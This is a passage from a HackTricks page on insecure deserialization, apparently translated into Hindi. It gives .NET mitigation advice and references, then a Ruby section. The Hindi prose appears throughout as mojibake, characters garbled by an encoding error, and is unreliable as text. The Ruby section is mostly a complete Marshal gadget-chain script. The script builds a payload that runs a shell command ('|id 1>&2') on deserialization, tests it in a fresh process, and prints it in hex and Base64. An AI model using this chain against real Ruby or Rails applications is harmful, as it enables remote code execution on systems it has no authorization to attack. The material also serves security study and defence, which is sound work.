- **рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рдЧреБрдгрд╡рддреНрддрд╛ рд╡рд╛рд▓реЗ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╕рддрд░реНрдХ рд░рд╣реЗрдВ**, рдЬреИрд╕реЗ `System.ComponentModel.DataAnnotations.ValidationException` рдЬрд┐рд╕рдореЗрдВ рдЙрд╕рдХреА `Value` рдЧреБрдгрд╡рддреНрддрд╛ рд╣реЛ, рдЬрд┐рд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

- **рд╡рдВрд╢реАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рд╕реЗ рдмрдЪрд╛рд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдХрд╛рд░ рдирд┐рд░реНрдорд╛рдг рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░реЗрдВ**, рдЬрд┐рд╕рд╕реЗ `DataContractSerializer` рдпрд╛ `XmlSerializer` рднреА рднреЗрджреНрдп рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

- **`BinaryFormatter` рдФрд░ `JSON.Net` рдХреЗ рд▓рд┐рдП рдПрдХ рдХрд╕реНрдЯрдо `SerializationBinder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдлреЗрдж рд╕реВрдЪреА рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░реЗрдВред**

- **.Net рдореЗрдВ рдкрддрд╛ рдЪрд▓реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╡рдВрд╢реАрдХрд░рдг рдЧреИрдЬреЗрдЯреНрд╕** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рд░рдЦреЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╡рдВрд╢реАрдХрд░рдгрдХрд░реНрддрд╛ рдРрд╕реЗ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдВрдЪрд╛рд▓рд┐рдд рди рдХрд░реЗрдВред

- **рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕реЗрд╕ рд╡рд╛рд▓реЗ рдХреЛрдб рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рдХреЛрдб рдХреЛ рдЕрд▓рдЧ рд░рдЦреЗрдВ** рддрд╛рдХрд┐ рдЬреНрдЮрд╛рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХреЛ рдЙрджреНрдШрд╛рдЯрд┐рдд рди рдХрд░реЗрдВ, рдЬреИрд╕реЗ WPF рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ `System.Windows.Data.ObjectDataProvider` рдХреЛ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЗрдЯрд╛ рд╕реНрд░реЛрддреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдмрдЪрд╛рдПрдВред

### **рд╕рдВрджрд░реНрдн**

* рдЬрд╛рд╡рд╛ рдФрд░ .Net JSON рд╡рдВрд╢реАрдХрд░рдг **рдкреЗрдкрд░:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** рдЯреЙрдХ: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) рдФрд░ рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **рд░реВрдмреА**

рд░реВрдмреА рдореЗрдВ, рд╡рдВрд╢реАрдХрд░рдг рдХреЛ **рдорд╛рд░реНрд╢рд▓** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рджреЛ рд╡рд┐рдзрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкрд╣рд▓рд╛ рд╡рд┐рдзрд┐, рдЬрд┐рд╕реЗ **рдбрдВрдк** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдмрд╛рдЗрдЯ рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╡рдВрд╢реАрдХрд░рдг рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрд▓реНрдЯреЗ, рджреВрд╕рд░рд╛ рд╡рд┐рдзрд┐, **рд▓реЛрдб** рдирд╛рдордХ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдмрд╛рдЗрдЯ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдлрд┐рд░ рд╕реЗ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╡рдВрд╢реАрдХрд░рдг рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╡рдВрд╢реАрдХрд░рдгрд┐рдд рдСрдмреНрдЬ
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ruby On Rails рдХреЛ рдЕрдиреБрднрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп RCE рд╢реНрд░реГрдВрдЦрд▓рд╛: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs** рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
